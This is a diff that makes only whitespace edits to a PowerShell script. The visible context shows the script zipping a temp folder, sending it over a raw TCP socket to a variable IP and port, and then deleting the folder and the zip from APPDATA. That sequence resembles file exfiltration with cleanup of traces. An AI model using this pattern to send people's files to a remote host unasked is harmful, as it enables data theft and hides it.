@@ -18,7 +18,7 @@ $IncludeBaseFolder = $false
 $zipTo = "{0}\{1}.zip" -f $tempFolderRoot,"ZIPPED"
 [Reflection.Assembly]::LoadWithPartialName( "System.IO.Compression.FileSystem" )
 [System.IO.Compression.ZipFile]::CreateFromDirectory($tempFolderFinal, $ZipTo, $CompressionToUse, $IncludeBaseFolder)
-$Address = [system.net.IPAddress]::Parse($IP) 
+$Address = [system.net.IPAddress]::Parse($IP)
 $socket = new-object System.Net.Sockets.TcpClient
 $socket.connect($Address, $port)
 $stream = $socket.GetStream()
@@ -31,4 +31,3 @@ $Socket.Close()
 #clean up temp files
 Remove-Item $tempFolderFinal -RECURSE
 Remove-Item $Env:APPDATA\ZIPPED.zip
-  
